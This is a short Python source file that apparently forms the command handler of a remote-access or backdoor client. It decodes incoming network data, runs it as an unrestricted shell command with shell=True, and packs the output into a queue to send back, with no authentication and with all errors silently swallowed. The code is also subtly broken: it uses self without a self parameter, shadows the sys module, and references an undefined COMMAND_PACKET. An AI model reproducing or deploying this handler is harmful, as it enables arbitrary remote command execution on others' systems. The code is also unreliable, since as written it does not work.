from infrastructure.queue.packet_queue import Queue
import subprocess
import sys

class Command():
    def execute(data):
        try:
            sys = subprocess.Popen(data.decode(), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            output, error = sys.communicate()

            sys_output = output if output else error

            if sys_output:
                self.queue.clear()
                Queue.put_nowait(COMMAND_PACKET + len(sys_output).to_bytes(3, "big") + sys_output)

        except:
            return